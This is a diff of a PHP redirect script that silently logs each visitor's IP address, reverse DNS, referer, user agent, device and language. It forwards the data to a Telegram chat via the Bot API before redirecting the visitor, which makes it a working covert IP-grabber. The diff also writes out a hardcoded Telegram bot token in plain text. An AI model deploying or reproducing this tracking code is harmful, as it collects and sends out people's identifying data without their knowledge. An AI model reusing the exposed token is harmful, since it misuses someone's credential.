@@ -5,11 +5,7 @@ date_default_timezone_set("Europe/Kiev");
 require_once 'vendor/autoload.php';
 use UAParser\Parser;
 
-
-//echo "qwe " . get_browser(null, false); 
-//$default_browser = $_SERVER['HTTP_USER_AGENT'];
-//$browser = get_browser($default_browser);
-//print_r($browser);
+define('TOKEN', '615799996:AAHE-PXAcmLClqHUbnYmWqYByUj8MyEba5A', true);
 
 if (substr($_SERVER['REQUEST_URI'], 0, 2) == "/r")
 {	
@@ -31,36 +27,19 @@ if (substr($_SERVER['REQUEST_URI'], 0, 2) == "/r")
 		//--
 		$parser = Parser::create();
 		$result = $parser->parse($_SERVER ['HTTP_USER_AGENT']);
-		$data = $data . "*User agent decoded:*\n\t" . $result->toString() . "\n";
+		$data = $data . "*User agent decoded:*\n\t" . $result->toString();
+		if($result->device->family != 'Other'){$data = $data . "/" . $result->device->family  . "\n";} else{$data = $data ."\n";}
 		//--
 		$data = $data . "*Language:*\n\t" . $_SERVER["HTTP_ACCEPT_LANGUAGE"] . "\n";
-		$token = "615799996:AAHE-PXAcmLClqHUbnYmWqYByUj8MyEba5A";		
 		$chatid = trim(file("./redirect/" . $filename . ".txt")[1]);
 		$mess = $data;
-		$tbot = file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chatid."&text=".urlencode($mess) . "&parse_mode=Markdown");	
+		$tbot = file_get_contents("https://api.telegram.org/bot".token."/sendMessage?chat_id=".$chatid."&text=".urlencode($mess) . "&parse_mode=Markdown");	
 		header("Location: " . $redirectid);
 	}
 	exit();
 }
 
 
-
-if (isset($_GET['s']))	
-{
-	$data = date('l jS \of F Y h:i:s A') . "\n";
-	$remote = $_SERVER ['REMOTE_ADDR'];
-	$data = $data . "Connecting from:\n\t" . $remote . " (" . gethostbyaddr($remote) . ")\n";
-	$data = $data . "Referer:\n\t" . $_SERVER ['HTTP_REFERER'] . "\n";
-	$data = $data . "User agent:\n\t" . $_SERVER ['HTTP_USER_AGENT'] . "\n";
-	$data = $data . "Language:\n\t" . $_SERVER["HTTP_ACCEPT_LANGUAGE"] . "\n";
-	$token = "615799996:AAHE-PXAcmLClqHUbnYmWqYByUj8MyEba5A";
-	$chatid = $_GET['id'];
-	$mess = $data;
-	$tbot = file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chatid."&text=".urlencode($mess));	
-	$lines = fopen('./redirect/' . htmlspecialchars($_GET["id"]) . '.txt', 'r');
-	header("Location: " . trim(fgets(fopen('./redirect/' . htmlspecialchars($_GET["id"]) . '.txt', 'r')), '"'));
-	exit();
-}
 if (count($_POST) > 0) {
 	$file = fopen("log.txt", "a");
 	fwrite($file, date('l jS \of F Y h:i:s A') . "\n");
@@ -86,7 +65,8 @@ if (count($_POST) > 0) {
 	$parser = Parser::create();
 	$result = $parser->parse($_SERVER ['HTTP_USER_AGENT']);
 	fwrite($file, "User agent decoded:\n\t" . $result->toString() . "\n");
-	$data = $data . "*User agent decoded:*\n\t" . $result->toString() . "\n";
+	$data = $data . "*User agent decoded:*\n\t" . $result->toString();
+	if($result->device->family != 'Other'){$data = $data . "/" . $result->device->family  . "\n";} else{$data = $data ."\n";}
 	//--
 	fwrite($file, "Language:\n\t" . $_SERVER["HTTP_ACCEPT_LANGUAGE"] . "\n");
 	$data = $data . "*Language:*\n\t" . $_SERVER["HTTP_ACCEPT_LANGUAGE"] . "\n";
@@ -127,10 +107,9 @@ if (count($_POST) > 0) {
 	fclose($file);
 	
 	if ($_POST['chatid'] != "none") {
-		$token = "615799996:AAHE-PXAcmLClqHUbnYmWqYByUj8MyEba5A"; //наш токен от telegram bot -а
 		$chatid = $_POST['chatid'];
 		$mess = $data;
-		$tbot = file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chatid."&text=".urlencode($mess) . "&parse_mode=Markdown");	
+		$tbot = file_get_contents("https://api.telegram.org/bot".token."/sendMessage?chat_id=".$chatid."&text=".urlencode($mess) . "&parse_mode=Markdown");	
 	}
 	exit();
 }
